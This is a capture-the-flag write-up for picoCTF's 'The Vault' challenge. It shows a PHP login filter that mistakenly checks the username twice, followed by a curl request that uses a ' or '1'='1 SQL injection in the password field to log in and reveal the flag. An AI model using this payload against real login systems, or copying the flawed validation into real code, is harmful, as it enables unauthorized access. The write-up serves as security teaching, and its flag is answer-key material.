# The Vault
## Question
>There is a website running at `http://2018shell.picoctf.com:56537` ([link](http://2018shell.picoctf.com:56537/)). Try to see if you can login! 

## Hint
>NA

# Solution
The [login.php source code](files/login.txt) is available as a link at the bottom of the authentication page.
It reveals several things:
* the database is SQLite3
* connection details and probably the `$FLAG` variable are stored in `config.php`
* there is a hidden variable named `debug` that you can use to show the SQL request which will be executed
* user inputs are checked (some characters are forbidden) to prevent SQL injection
* if the SQL request returns a result, the flag is displayed, else, `Login failed.` will appear

That's a lot of information. Let's analyze the SQL injection protection.

Carefully analyzing the PHP code will reveal a typo the developer has made. Notice that the `preg_match` is done twice for the `$username`, even for the `$password_match`, hence leaving the `password` input unchecked.
```php
  //validation check
  $pattern ="/.*['\"].*OR.*/i";
  $user_match = preg_match($pattern, $username);
  $password_match = preg_match($pattern, $username);
  if($user_match + $password_match > 0)  {
    echo "<h1>SQLi detected.</h1>";
  }
```

Let's exploit this vulnerability:
~~~~
$ curl -d "username=admin&password=' or '1'='1&debug=1" -X POST http://2018shell.picoctf.com:56537/login.php
<pre>username: admin
password: ' or '1'='1
SQL query: SELECT 1 FROM users WHERE name='admin' AND password='' or '1'='1'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{w3lc0m3_t0_th3_vau1t_c09f30a0}</p>
~~~~

# Flag
`picoCTF{w3lc0m3_t0_th3_vau1t_c09f30a0}`
